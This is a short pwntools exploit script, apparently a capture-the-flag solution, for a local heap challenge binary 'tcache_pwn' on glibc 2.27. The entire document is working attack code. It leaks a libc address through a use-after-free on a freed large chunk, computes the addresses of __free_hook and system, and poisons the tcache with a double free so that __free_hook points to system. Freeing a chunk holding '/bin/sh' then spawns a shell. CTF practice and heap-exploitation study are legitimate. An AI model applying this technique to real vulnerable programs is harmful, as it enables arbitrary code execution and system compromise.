# glibc-2.27
from pwn import *
p = process("./tcache_pwn")
libc = ELF("/libc-2.27.so")

get = lambda data: u64(data + '\x00\x00')


def add(sz, ctn='1'):
    p.sendlineafter("choice>\n", '1')
    p.sendlineafter("length\n", str(sz))
    p.sendlineafter("flag\n", ctn)


def check(idx):
    p.sendlineafter("choice>\n", '2')
    p.sendlineafter("index\n", str(idx))


def delete(idx):
    p.sendlineafter("choice>\n", '3')
    p.sendlineafter("index\n", str(idx))


add(0x500)
add(0x10, '/bin/sh\x00')
add(0x10)
add(0x10)
delete(0)
check(0)
main_arena = get(p.recv(6)) - 96
print "main arena: " + hex(main_arena)
libc_base = main_arena - 0x3EBC40
print "libc base: " + hex(libc_base)
free_hook = libc_base + libc.symbols['__free_hook']
print "free hook: " + hex(free_hook)
libc_system = libc_base + libc.symbols['system']
delete(2)
delete(2)
add(0x10, p64(free_hook))
add(0x10)
add(0x10, p64(libc_system))
delete(1)
p.interactive()